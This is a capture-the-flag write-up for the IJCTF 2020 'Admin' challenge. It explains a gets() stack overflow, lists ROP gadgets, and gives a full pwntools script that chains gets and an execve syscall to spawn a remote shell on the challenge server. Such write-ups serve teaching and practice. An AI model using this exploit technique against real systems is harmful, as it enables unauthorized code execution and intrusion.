IJCTF 2020  
Admin - (100PT)

####################################################################################################  
Description

This admin thinks his system is very safe Is it actually safe? I say it’s safe
what do you think?  
nc 35.186.153.116 7002  
##################

Analysis:  
admin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically
linked, for GNU/Linux 3.2.0,
BuildID[sha1]=0ee31668ec040c05db870d1fcef7e198c0a53d37, stripped  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)

BOF in main  
void main(void)

{  
 int iVar1;  
 undefined auStack72 [64];  
  
 puts(&UNK_004923e4);  
 gets(auStack72); #vulnerable call to gets  
  
 iVar1 = func_0x00400498(auStack72,&UNK_004923ef);  
 if (iVar1 == 0) {  
   puts(&UNK_004923f5);  
 }  
 else {  
   printf(&UNK_00492403,auStack72);  
 }  
 return;  
}

##################  
since the binary is statically linked and it has no pie , No canary.  
Solution : Creating a ROP chain.

rp++ found us some intresting gadgets.

pop_rdi =   0x41dc9a #: pop rdi ; ret ;  
pop_rax =   0x475757 #: pop rax ; ret ;  
pop_rsi =   0x48208c #: pop rsi ; ret ;  
pop_rdx =   0x4aeef2 #: pop rdx ; ret ;  
syscall =   0x475485 #: syscall ;  
###################

we can create a rop chain which will return to gets function to store our
string somewhere in the memory,  
and then we setup the registers for a sys_execve call,

Here is the syscall reference for x64:
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

------------------------------------------- EXPLOIT ------------------------------------------  
#! /usr/bin/env python3  
from pwn import *  
context.arch='amd64'  
io = remote('35.186.153.116', 7002)  
elf = ELF('admin')

write_mem = 0x6bb300 #the bss segment.  
pop_rdi =   0x41dc9a #: pop rdi ; ret ;  
pop_rax =   0x475757 #: pop rax ; ret ;  
pop_rsi =   0x48208c #: pop rsi ; ret ;  
pop_rdx =   0x4aeef2 #: pop rdx ; ret ;  
syscall =   0x475485 #: syscall ;  
gets = 0x410330 #gets function in binary ;

rop = flat([

	'a'*72, #Padding of 72  
	#we return to pop rdi  gadget;  
	pop_rdi, #pop rdi ; ret ;  
	#pop the address where we want our /bin/sh string to be.  
	write_mem,   
	#return to gets function.  
	gets, #return to gets ;  
	#after gets we return to pop_rdi again,  
	pop_rdi,  
	write_mem, #bin_sh  
	pop_rax, #pop rax ; ret ;  
	0x3b, #syscall number for execve  
	pop_rsi, #pop rsi ; ret ;  
	0x0,  
	pop_rdx, #pop rdx ; ret ;  
	0x0,  
	syscall  
])  
io.sendline(rop)  
#we send /bin/sh  
io.sendline('/bin/sh')  
#pop the shell  
io.interactive()  
---------------------------------------------------------------------------------------------------

If you need any guide on how ROP works.  
There is amazing information available on https://ropemporium.com  

Original writeup
(https://github.com/ano12-dev/IJCTF_writeups/blob/master/admin/writeup).